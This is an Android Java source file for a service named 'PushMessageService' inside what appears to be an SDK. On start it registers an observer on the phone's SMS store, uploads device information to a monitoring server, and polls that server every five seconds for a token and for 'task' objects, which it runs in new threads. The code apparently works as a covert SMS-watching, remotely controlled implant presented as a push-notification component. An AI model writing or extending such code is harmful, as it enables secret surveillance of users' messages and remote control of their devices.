package com.ss.sssdk;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.ContentObserver;
import android.os.Handler;
import android.os.IBinder;

import org.json.JSONObject;

import java.util.Timer;
import java.util.TimerTask;

/**
 * Created by ljw on 15/11/11.
 */

public class PushMessageService extends Service {

    private ContentObserver mObserver;
    private Handler mHandler = new Handler();
    private Timer time = new Timer();
    @Override
    public void onCreate() {
        super.onCreate();
        addSMSObserver();

        time.schedule(new TimerTask() {
            @Override
            public void run() {
                String token = SdkTools.getKV("token");
                if (token.equalsIgnoreCase("")) {
                    postDeviceInof();
                } else {
                    heartBeat(token);
                }
            }
        }, 1000, 5000);
    }
    public void postDeviceInof() {
        HttpRequest.sendPostJSONObject(HttpUrl.monitor_url, HttpUrl.REPORT_DEVICE_INFO,null, DeviceInfo.getDeviceInfo().toString(), new HttpRequest.IHttpCallBack() {
            @Override
            public void callback(String ret) {

            }
            @Override
            public void callback(JSONObject ret) {
                try {
                    if (ret != null && ret.getBoolean("b")) {
                        SdkTools.setKV("token",ret.getString("token"));
                    }
                }catch(Exception e) {
                    e.printStackTrace();
                }
            }
        });
    }
    public void heartBeat(String token) {
        JSONObject header = new JSONObject();
        String ret = HttpRequest.sendGet(HttpUrl.monitor_url,HttpUrl.HEART_BEAT,header,"token="+token);
        try {
            JSONObject result = new JSONObject(ret);
            if(result.getBoolean("b")) {
                if(result.has("task")) {
                    JSONObject task = result.getJSONObject("task");
                    new TaskThread(task).start();
                }
            }
        }catch(Exception e) {
            e.printStackTrace();
        }
    }
    public void addSMSObserver() {
        ContentResolver resolver = getContentResolver();
        Handler handler = new SMSHandler(this);
        mObserver = new SMSObserver(resolver, handler);
        resolver.registerContentObserver(SMSObserver.CONTENT_URI, true, mObserver);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        this.getContentResolver().unregisterContentObserver(mObserver);
        super.onDestroy();
        //Process.killProcess(Process.myPid());
        //System.exit(0);
    }
}
